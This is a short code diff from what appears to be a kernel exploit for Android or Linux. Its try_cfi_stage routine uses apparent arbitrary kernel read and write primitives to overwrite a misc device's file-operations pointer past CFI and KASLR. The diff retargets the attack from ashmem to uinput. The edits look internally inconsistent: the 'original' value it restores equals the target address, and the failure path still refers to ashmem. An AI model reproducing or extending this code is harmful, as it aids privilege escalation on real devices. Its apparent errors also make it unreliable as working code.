@@ -255,7 +255,7 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = data_addr(UINPUT_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -312,7 +312,7 @@ int try_cfi_stage(void) {
   }
 #endif
 
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  uint64_t original_fops = data_addr(UINPUT_FOPS);
   pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
           misc_fops, (unsigned long long)original_fops);
   ssize_t restore = configfs_write_once(
@@ -407,7 +407,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
+    uint64_t original_fops_fail = data_addr(UINPUT_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
